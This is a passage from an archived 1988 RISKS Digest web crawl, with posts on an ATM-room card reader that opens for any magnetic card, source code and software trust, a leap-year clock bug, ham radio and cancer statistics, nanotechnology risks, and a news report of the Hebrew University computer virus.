systems included back pain from poor ergonomic design of workstations,
and skin irritations.  The latter occur as CRTs tend to precipitate
out airborne particulates due to static charge on the screen.
People will touch the screen and spread such material on their skin.
The "high tech" solution for this problem was to clean the screens
daily.  

   The terminal screen I'm using right now looks somewhat dusty --
time to get out the anti-static screen cleaner!

Steve Philipson      steve@ames-aurora.arpa       WB2EUZ/6

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
getting into ATM rooms -- Play-Safe: it could save your life
</A>
</H3>
<address>
&lt;<A HREF="mailto:mar@ATHENA.MIT.EDU">
mar@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 5 Jan 88 16:16:44 EST
</i><PRE>

Many ATMs are in small rooms which you enter by putting your bank card into
a card reader.  I had been wondering how it knew to let you in, since cards
from out-of-town banks work, and there's no noticible pause for it to look
up your institution to see if you should have access.

Yesterday I tried an experiment, and discovered that my AT&amp;T calling
card, and even a rapid transit pass would open the door.  I think
their algorithm is "if there are bits on the card, unlock the door".

What's the interest to RISKS (besides sharing more ATM trivia, which
flourishes here)?  The reverence people hold for technology.  The magnetic
stripe and card reader imply a computer, so people think that they have
controlled access.  Most people would never think to question it, and don't
know what shortcuts are taken.  The mistake will come when someone wants to
use one of those cardreaders to control access to a room where the security
really does matter.
					-Mark

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Knowing Source Code is not Sufficient
</A>
</H3>
<address>
Michael Wagner 
&lt;<A HREF="mailto:WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU">
WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
06 Jan 88 12:30:46
</i><PRE>

In Risks 6.3, William Smith wrote:
&gt; &gt;             IF YOU CAN'T READ IT, DON'T RUN IT
&gt;
&gt; Unfortunately, this is not sufficient if the vendor of your
&gt; software is not trustworthy.

We seem to be trying to solve several different problems here, and
that may be part of the confusion.  Having the source to a piece of
public domain software might help you find out what it's going to do
to you.  At least it's better than a kick in the pants.  You
generally have little other recourse in the case of a piece of
software the originator won't support.

On the other hand, untrustworthy vendors have entered into a
contract with you, and the fact that they (or one of their
employees) injected a virus into the program they sold you is quite
a different matter.

&gt; When you buy a tool such as an automobile, you do not ask to see all
&gt; of the engineering drawings and analyses to decide that the car is
&gt; safe.  An amount of trust is necessary when using any technology.

But surely not blind trust.  There are whole organizations set up to judge
cars on their abilities to perform according to specification, and the
informed buyer is always able to read those reports and make the appropriate
judgement.  Since testing isn't always enough, there is also a legal
mechanism to sue in cases where the product fails to perform.  It seems no
one cares enough yet to test software thoroughly (not even mass-market
stuff).  Not sure why.
                                        Michael

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Trust and quoting and write-only hard disks.
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
06 Jan 88 11:41:03
</i><PRE>
From: Michael Wagner &lt;WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU&gt;

Since we are talking about trusting code (and implictly, other
people), how trusting are we about documents we get from elsewhere?
In Risks 6.2, "guthery%asc@sdr.slb.com" wrote:

&gt; As a little bit of reflection ... will show, there is no
&gt; protection in trying programs out with write-only harddisks or
&gt; with privileges turned off.

When I first saw this, I wondered what good a write-only hard disk would be
in this application (or in any other, for that matter).  I had to read on a
bit, and then backtrack, to guess that this probably should have been a
read-only hard disk.  Seemingly, no one else wondered about this, because
the line was quoted two times in the next issue of Risks, without any signal
(the usual one is to write 'sic' in parenthesis after the word) that this
may be an error in the original.

If you think this is quibbling, then you must answer the question:
how well can you proof-read a piece of source code for subtleties?

Consider:  the original author missed it, the moderator missed it, and at
least those two who quoted it (and can therefore be assumed to have spent
some time considering the quote) in Risks 6.2 missed it.  Each read what
they wanted to read there, and not what really was there.  Exactly how I
would disguise a Trojan horse in a source (a horse in a source?  A horse, of
course.  Sounds like Dr. Seuss!) were I to so desire.
                                                            Michael

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.03.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.05.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-41</DOCNO>
<DOCOLDNO>IA012-000130-B023-224</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.5.html 128.240.150.127 19970217014947 text/html 18933
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:48:15 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 5</TITLE>
<LINK REL="Prev" HREF="/Risks/6.04.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.06.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.04.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.06.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 5</H1>
<H2> Thursday, 7 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: PCs die of New Year Cerebration 
</A>
<DD>
<A HREF="#subj1.1">
John Owens
</A><br>
<A HREF="#subj1.2">
 Paul F Cudney
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Source code vs. attacks -- Avoidance techniques 
</A>
<DD>
<A HREF="#subj2.1">
David Collier-Brown
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Ham Radiation and Cancer 
</A>
<DD>
<A HREF="#subj3.1">
Barry Ornitz [long]
</A><br>
<A HREF="#subj3.2">
 Martin Ewing
</A><br>
<A HREF="#subj3.3">
 Douglas Jones
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
     Re: PCs die of New Year Cerebration
</A>
</H3>
<address>
John Owens 
&lt;<A HREF="mailto:OWENSJ@VTVM1.CC.VT.EDU">
OWENSJ@VTVM1.CC.VT.EDU
</A>&gt;
</address>
<i>
Thu, 07 Jan 88 12:43:11 EST
</i><PRE>

Scot E. Wilcoxon writes:

&gt;One of my clients has just reported to me that a certain brand of
&gt;PC-compatibles which they sold in 1984 suddenly stopped working when 1988
&gt;was reached...

Just to avoid any confusion, it is quite unlikely that Scot is referring
to a PC-compatible at all, but to a problem with Sun Microsystems UNIX
workstations.  Recent versions of the operating system had a bug in
the time of day code which caused a warning message at boot time and
problems setting the time _in a leap year_.

(The bug was caused by an expression with a side effect being passed
as an argument to a macro which evaluated the expression twice.)

Sun has published the fix on various mailing lists and USENET groups;
if you have the problem and don't have the patch, send mail to chuq@sun.com.

-John Owen, Virginia Tech Communications Network Service  
OWENSJ@VTVM1.BITNET                      +1 703 961 7827

</PRE>
<HR><H3><A NAME="subj1.2">
 Leaping Clocks
</A>
</H3>
<address>
Paul F Cudney 
&lt;<A HREF="mailto:Cudney@DOCKMASTER.ARPA">
Cudney@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 7 Jan 88 00:02 EST
</i><PRE>

... Although resolved in just a few days, [this problem] highlights our 
assumption that workstation "owners" are OS-wise (or can obtain competent
assistance).  With the ubiquitous spread of ever more complex systems,
shouldn't we be demanding self-validating system maintenance tools useable
by un-OSphisticated users?
                                               Paul

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Source code vs. attacks -- Avoidance techniques
</A>
</H3>
<address>
David Collier-Brown
&lt;<A HREF="mailto:geac!daveb@uunet.UU.NET ">
geac!daveb@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 6 Jan 88 18:50:12 GMT
Organization: Geac Computers Corporation Ltd.

  Chris Torek &lt;chris@mimsy.umd.edu&gt;, comments:
  What, then, are we to do?  Form a software users' union?  (I am
  only half joking.)  I would very much appreciate receiving source
  code to the binaries I must run..

In fact, the Honeywell Large Systems User's Group is such a union, and votes
semi-annually on features to be required or to be removed from Honeywell (now
-Bull) software.  One of the fallbacks from requiring improved maintenance, is
to require source code. This also is the normal behavior when HW when a system
is to be taken off maintenance (ie, one normally gets either maintenance or
source, but not both).

David Collier-Brown, Geac Computers International Inc., 350 Steelcase
Road, Markham, Ontario, CANADA, L3R 1B3 (416) 475-0525 x3279
{mnetor|yetti|utgpu}!geac!daveb

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Ham Radiation and Cancer
</A>
</H3>
<address>
barry ornitz
&lt;<A HREF="mailto:ucbcad!ames.UUCP!rochester!kodak!ornitz@ucbvax.Berkeley.EDU ">
ucbcad!ames.UUCP!rochester!kodak!ornitz@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Wed, 6 Jan 88 23:07:43 EST
</i><PRE>

[The following is an article I posted on the subject of Cancer and Electro-
magnetic Radiation.  I have received several replies on my posting; two
disputed Dr. Milham's statistics based on Poisson distributions, and one mailed
an article on Milham's previous article in 1985 in Lancet.   Barry]

In yesterday's newspaper, I noticed with great interest an article entitled

          "Link suggested between cancer,  electromagnetic fields."

The article had the byline of the Associated Press, Tacoma, WA.  It was
stated in the article that "amateur radio operators in two states appear to
die at abnormally high rates from several forms of cancer, suggesting a
possible link between cancer and electromagnetic fields, according to data
collected by a state epidemiologist."  This article appears to be prompted
by work published in the American Journal of Epidemiology by Dr. Samuel
Milham Jr. of the Washington Department of Social and Health Services.
According to the article, Dr. Milham studied the deaths of 2,485 Washington
and California amateur (ham) radio operators between 1979 and 1984.  Based
on a population this size, he found the following data:

                               Expected                  Actual
     Cause                      Deaths                   Deaths
     ------------------------  -----------------------  -----------
     Leukemia                     29                       36
     Lymphatic &amp; Blood Forming
         Organ Cancers            72                       89
     Prostate Cancer              67.6 (!)                 78

I am not sure about the statistical differences between these numbers, but I am
certain that a trained epidemiologist would check the statistical significance
of his data before publishing.  Dr. Milham is further reported to have
concluded that "amateur radio operator licensees in Washington state and
California have significant excess mortality due to acute myloid leukemia,
multiple myeloma and perhaps certain types of malignant lymphoma."

The Associated Press article also quoted Leonard Sagan, program manager for
radiation studies at the Electric Power Research Institute in Palo Alto, CA.
Sagan warned that studies like Dr. Milham's could be misinterpreted, and that
the "findings could be simple associations that have nothing to do with cancer
causes among people who work with electricity."

Having been an amateur radio operator for over twenty-three years, and having
been concerned with the safety of exposure to non-ionizing, radio frequency
electromagnetic energy as a small portion of my job, I have a few comments
about this article.  Before I begin, I should state that my title of Dr. is not
a medical one, but rather a PhD in Engineering.  I should also state that I
have not yet read the article in the American Journal of Epidemiology.

The medical effects of exposure to electromagnetic radiation have been shown to
be frequency dependent.  This is logical since as the wavelength of radiation
approaches the dimensions of the human body, absorption of the radiation is
enhanced due to more efficient coupling into the body.  At higher frequencies
(shorter wavelengths), typically in the microwave region, the electromagnetic
radiation is absorbed near the surface of the body.  The ANSI standards for
exposure to radio frequency energy take this information into account, placing
the most strict requirements on frequencies in the VHF (very high frequency)
region.  Amateur use of the VHF spectrum, while dating back over fifty years,
has primarily been negligible until twenty years ago.  Amateur transmitter
power levels in the VHF region have generally been much lower than the power
levels used in the high frequency bands.  Antenna placement for VHF, in terms
of wavelengths from the amateur's operating position, is generally high.  These
three facts would tend to cancel the increased hazard of VHF radiation.  To
test Milham's hypothesis further, a study of FM broadcast engineers, commercial
two-way radio technicians, and television transmitter engineers should be
performed since these persons are all exposed to various levels of VHF
radiation.  The highest field strengths to which amateur radio operators are
normally exposed come from the near field antenna radiation during high
frequency operation.  Power levels of up to two kilowatts may be used with
antenna placement often below a wavelength.  It should be noted that exposure
to this power level is intermittent in most amateur operation.  If Milham's
hypothesis is correct, broadcast technicians and engineers for commercial AM
and especially short wave broadcast stations, as well as military communication
operators should show even higher levels of cancer deaths than hams.  Operation
on microwave frequencies by amateur radio operators is rare; furthermore, I
would expect any cancers caused by microwaves to be other than deep tissue
cancers.  A study of the eyes for cataracts would be in order, too, since
microwave exposure generally causes eye problems prior to additional damage in
the human body.

I believe that other causality should be investigated by the medical profession
before Dr. Milham's conclusions are accepted.  I would expect that the amateurs
studied by Dr. Milham were mostly individuals who had been hams for many years.
An analysis including the length of time that the amateurs were licensed (or at
least active) would be in order.  I believe that this analysis would show some
increased mortality (adjusted for age, of course) for the older hams.  If this
increased mortality exists, I feel that other environmental factors should be
studied in addition to exposure to electromagnetic fields.

Until twenty-five to thirty years ago, much of the amateur radio equipment in
use was home constructed.  The construction of electronic equipment at this and
especially prior years, exposed the amateur to a number of chemical hazards,
many of which were not known as hazards at the time.  For example, I would
expect to see higher than normal levels of metals in older hams such as tin,
lead, bismuth, antimony, and cadmium (from soldering); mercury (from broken
rectifier tubes and relays); barium, beryllium, and rare earth oxides (from
broken vacuum tubes and phosphors from cathode ray tubes); radium (from
luminescent dials); selenium (from rectifiers); and manganese and zinc (from
batteries).  Likewise these hams would have been exposed to rosin fumes
containing numerous organic acids (from soldering), paint solvents and cleaning
fluids such as benzene and carbon tetrachloride, phenol (from burnt phenolic
insulators), and asbestos.  Even more insidious, however, was the exposure to
transformer and capacitor impregnating oils.  These oils often contained
poly-chlorinated biphenyls (PCB's) as flame retardants, sometimes in quite high
concentrations.

These chemical hazards were not unique to amateur radio operators only.  Other
electronic hobbyists as well as people manufacturing electronic equipment would
have been exposed to similar hazards.  I feel that it would be prudent to
compare mortality rates of workers in oil-filled capacitor manufacturing plants
to those of the hams studied [for example, the Sangamo capacitor plant in
Pickens, SC, which until several years ago was a major user of PCB oils].

In conclusion, I believe that other causal relationships between cancer deaths
and amateur radio operators may more adequately explain Milham's data.  I
propose that Milham or other epidemiologists expand their study to include the
other occupations I have suggested above.  I further propose that age-adjusted
mortality rates be calculated for the existing data to determine whether length
of exposure or date of exposure is significant and whether chemical exposure of
these hams might be significant.  I am certain that electromagnetic radiation
has effects on the human body, but I do believe that electromagnetic radiation
is not the major cause of the increase in cancer deaths as stated by Dr.Milham.

For those persons interested in further study on the effects of electromagnetic
radiation, I would suggest the American National Standards Institute document
ANSI C95.1-1982, Safety Levels with Respect to Human Exposure to Radio
Frequency Electromagnetic Fields, 300 kHz to 100 GHz.  This standard contains
an appendix listing numerous references on the biological effects of
radio-frequency electromagnetic fields.  A number of other standards exist for
radio-frequency and microwave exposure; many of these are listed in the
Microwave Engineer's Handbook, Vol. 2.

If anyone has read Dr. Milham's original article, I would appreciate their
sending me the exact title and the date of publication so I might have our
library order a copy.  I would also appreciate the comments of other amateurs
as well as physicians on this subject.  Please email responses directly to me
and I will summarize or cross-post your replies to both rec.ham-radio and
sci.med (many hams on ARPA receive their postings via an automatic mailing list
rather than a newsgroup).

Thanks and 73 [ham radio jargon for best regards].
                                   Barry L. Ornitz   WA4VZQ

Dr. Barry L. Ornitz   UUCP:...!rochester!kodak!ornitz
Eastman Kodak Company, Eastman Chemicals Division Research Laboratories
P. O. Box 1972, Kingsport, TN  37662       615/229-4904

</PRE>
<HR><H3><A NAME="subj3.2">
 Risks of Amateur Radio
</A>
</H3>
<address>
Martin Ewing
&lt;<A HREF="mailto:msesys@DEImos.Caltech.Edu ">
msesys@DEImos.Caltech.Edu 
</A>&gt;
</address>
<i>
Wed, 6 Jan 88 17:37:01 PST
</i><PRE>

I also noted Dr Milham's study of ham radio operators vs cancer
statistics.  The press report was undoutably mangled, but as a sometime
radio amateur, I can add some questions and comments. 

Was there any analysis of the actual RF exposure to the amateurs?
Typical amateur radio operations involves &lt;&lt;50% of time spent in actual
transmission.  Typical frequencies range from 3.5 to 220 MHz, and power
levels from 5 W to 1 kW.  Emission modes vary, but single-sideband voice
is most common up to 30 MHz; SSB duty cycles are &lt;&lt;100% even when
transmitting.  Antennas range from large yagi arrays on high towers to
loaded 1/4 wave "rubber duckies" held next to the head while using VHF
handheld equipment.  Many licensees are inactive, too. 

Was there any demographic control?  Ham operators have a peculiar
distribution, with "peaks" among young-adult techies and retired
middle-class WASP males. 

Hams expose themselves to various other potential hazards: solvents
and smoke during soldering, PCBs from transformer and capacitor oils,
etc.  Why should one suspect RF exposure in particular? 

Apparently the study came out in a reputable journal, so it may
deserve a better review than the AP (and we) are giving it. 

Martin Ewing, Caltech 

</PRE>
<HR><H3><A NAME="subj3.3">
Re: Ham radios and non-ionizing radiation
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones%cs.uiowa.edu@RELAY.CS.NET">
jones%cs.uiowa.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Wed, 6 Jan 88 11:16:58 CST
</i><PRE>

Eric Townsend's note raises the possibility of a
  &gt;  link between cancer and electromagnetic fields
in the context of a study of cancer cases among ham radio operators.

I would not be surprised to find a link between ham radio operation and cancer
for a completely unrelated reason:  Ham radio operators tend to work with
electronics, exposing them to many interesting chemicals in the process,
including lead vapor from hot solder and vaporized solder flux, not to mention
coil dope, red glypt, and other oddities.  Older ham radio equipment
frequently contained large oil-filed capacitors (possibly containing PCB
oils), and who can forget the ozone smell caused by the high plate voltages
used by pre-1970 transmitters.

I don't mean to imply that there is no risk associated with the high fields
around a radio transmitter, after all, you can cook hot-dogs by putting them
inside the antenna impedence matching coils, but there are other possible
causes of the small increase in cancer risk that was observed.

A good experiment to test these risks would be to look at the cancer rate
among model railroaders.  They also solder things and work with related
chemicals, but the electric fields they are exposed to are produced by a
source with a maximum power of 12 watts (12 volts at one amp, DC power to
the track).
				Douglas Jones

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.04.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.06.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-42</DOCNO>
<DOCOLDNO>IA012-000130-B023-246</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.6.html 128.240.150.127 19970217015000 text/html 17347
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:48:27 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 6</TITLE>
<LINK REL="Prev" HREF="/Risks/6.05.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.07.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.05.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.07.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 6</H1>
<H2> Friday, 8 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Engines Of Creation, Engines of Destruction 
</A>
<DD>
<A HREF="#subj1.1">
Eric S. Raymond
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  An Israeli virus 
</A>
<DD>
<A HREF="#subj2.1">
Mike Linnig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Getting into ATM rooms 
</A>
<DD>
<A HREF="#subj3.1">
Bob Larson
</A><br>
<A HREF="#subj3.2">
 Fuat C. Baran
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Power lines 
</A>
<DD>
<A HREF="#subj4.1">
Prentiss Riddle
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Engines Of Creation, Engines of Destruction
</A>
</H3>
<address>
Eric S. Raymond
&lt;<A HREF="mailto:cbmvax!snark!eric@RUTGERS.EDU ">
cbmvax!snark!eric@RUTGERS.EDU 
</A>&gt;
</address>
<i>
6 Jan 88 15:09:03 GMT
</i><PRE>

   I've just finished K. Eric Drexler's _Engines_Of_Creation_ and my brain-pan
is bubbling with peculiar and fascinating thoughts. I'll list a few of them
here, hoping to start off discussions in the appropriate newsgroups. People
on USENET and the institutions they represent are likely to be at the leading
edge of the nanotechnology revolution. If Drexler's estimates are anywhere
near correct it's none too soon to start thinking about benefits, risks, costs
and strategies.

   In arranging the questions below I have tried to order them by increasing
'softness', i.e. the extent to which answers must involve social and ethical
judgement as opposed to matters of hard technical fact.

   I have cross-posted to many groups because the potentials and pitfalls
of nanotechnology are so sweeping that multi-disciplinary thinking will be
not only appropriate but utterly necessary. For some of the points below,
I have indicated individual newsgroups where discussion may end up.

   0. Is Drexler or the the Foresight Institute on the net?

   1. Drexler claims that there are no fundamental physical limitations in
the way of nanotechnology. He points at life itself as a feasibility proof.
Is this appropriate? Might his smaller, "harder" nanosystems be critically
vulnerable to thermal noise, quantum effects, background radiation? Can we
estimate the mean frequency of disruptive events as a function of feature
size, perhaps using data from soft errors in ICs as a baseline?

   2. (comp.ai) Is his vision of the near-term potential of AI too sanguine?
Without reopening the perennial theological debates on strong AI, what is the
sense of experts in the field on the feasibility of the intelligent engineering
assistants he sees as important for nanotechnology? Does an expert system
for engineering design need the elusive "common sense"? What, if anything, can
we say in advance about special problems or helpful structure of nanotechnology
as a design problem domain?

   3. (comp.risks) Drexler discusses countermeasures to the "Gray Goo" threat
(i.e. the possibility of nanomachines programmed or misprogrammed to make
copies of themselves without limit). In doing so, he picks what is perhaps the
easiest disaster case to guard against, because it would become obvious very
quickly, they aren't likely to be invulnerable to atomic weapons, and there
would be few reasons not to nuke an expanding blob of the stuff.
   It seems that "invisible" nanoplagues would be far more dangerous (imagine
a "vampire" replicator programmed to seek and destroy hemoglobin molecules,
replicating only for some fixed period of time after finding one, and then
seeking another host). What countermeasures against invisible nanoplagues can
we imagine? Might analogies from biological warfare be helpful?

   4. (comp.risks) Along the same lines: Drexler talks about "sealed labs" as
development environments, advancing one concept design for a tiny nanolab
surrounded by shells of diamond, explosives, thermite, etc. primed to destruct
on tampering. What about tampering from the *inside*? Can we imagine trigger
mechanisms that are reliable in the face of attacks by programmable
nanomachines directed by someone who wants to crack the lab? (perhaps something
could be done with isotopic abundances and dead-man sensors?).

   5. Do combinations of nanoassemblers and disassemblers imply a practical
capacity for matter duplication at the molecular level? If so, what of the
possibilities for counterfeiting? 'teleportation' of complex objects? Might
the duplicatable objects eventually include human beings?

   6. Even with only partial matter-duplication, nanotechnology implies
economic dislocations that will make the First Industrial Revolution (steam
and steel) and the Second (computers) look like garden parties. It looks as
though the valuables of the future will be human attention, design information,
and elemental raw materials. Can we project the kind of economy this implies?
How should we expect the stages of transition to it depend on plateaux of
duplication capacity?

   7. Even if economic change did not generally force social change, mature
nanotechnology would imply some novel problems -- for example, might the huge
increase in the Earth's carrying capacity due to assembler/disassembler
technology lead to a Malthusian population explosion and the cannibalization
and collapse of the natural biosphere? Or can we expect the explosion to
take place into the rest of the Solar System?
   In view of our poor past record at protecting irreplaceable biomes against
destructive development once it became economically feasible, is there reason
to think we can solve the problem with social and legal controls this time?
Do the special characteristics of nanotechnology suggest any technological fix?

   8. What social changes can we project for coping with the huge increases in
personal wealth (= power to manipulate matter and energy to taste) implied by
nanotechnology? What do the effects of past increases suggest? Are these
suggestions really applicable?

   9. (talk.politics.theory) In theory, individuals owning self-repairing
nanotechnological molecular fabricators could opt out of what remains of the
material economy. Is this a recipe for a non-Marxian withering-away of the
State? What happens to politics when 'redistribution of wealth' is as dead as
high feudalism? Is this a recipe for anarcho-libertarian utopia?

   10. What can we do *here* and *now* to accelerate and guide the development
of nanotechnology (so that, for example, as many of us as possible can use
nanomachine-based medical technology to choose to live healthy lives until
accident or our own choices kill us).

   I hope to begin a continuing discussion of these issues. If volume is high
enough to warrant it, I will volunteer to manage a mailing list and/or
moderate a newsgroup.

   For the moment, I suggest that articles be cross-posted to misc.misc.

      Eric S. Raymond
      UUCP:  {{seismo,ihnp4,rutgers}!cbmvax,sdcrdcf!burdvax,vu-vlsi}!snark!eric
      Post:  22 South Warren Avenue, Malvern, PA 19355    Phone: (215)-296-5718

          [I have a feeling that responses might best go to Eric, letting
          him try to exert a little discipine over the discussion.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
An Israeli virus
</A>
</H3>
<address>
Mike Linnig 
&lt;<A HREF="mailto:LINNIG%eg.ti.com@RELAY.CS.NET">
LINNIG%eg.ti.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Thu, 7 Jan 88 19:38 CDT
</i><PRE>

From The Fort Worth Star Telegram's Startext Information Service:

( 1/07/88- 1:31 pm)
Hebrew University computers sabotaged by electronic "virus'

  JERUSALEM (AP) -- A saboteur infected Hebrew University computers with an
electronic "virus" that threatens to destroy thousands of files and wipe out
years of research, a university employee said Thursday.
  "It is the most devastating thing we've ever come across," said Yisrael
Radai, a senior programmer at the university's computer center.
  A "virus" is computer jargon for a self-propagating set of orders devised by
a saboteur that spreads from one computer disk to another to cause mischief or
harm.
  Radai said that soon after the virus was discovered last week, university
computer experts developed an antidote to diagnose and treat it. But there is
still a danger that many users will not learn they have been affected until it
is too late.
  The virus threatened to wipe out research data, financial statements,
ledgers, lists of students and other vital information compiled by
administrators, teachers, and students.
  Radai said other institutions and individuals in Israel have been
contaminated. In fact, anyone using a contaminated disk in an IBM or
IBM-compatible computer was a potential victim, he said.
  The virus was devised and introduced several months ago by "an evidently
mentally ill person who wanted to wield power over others and didn't care how
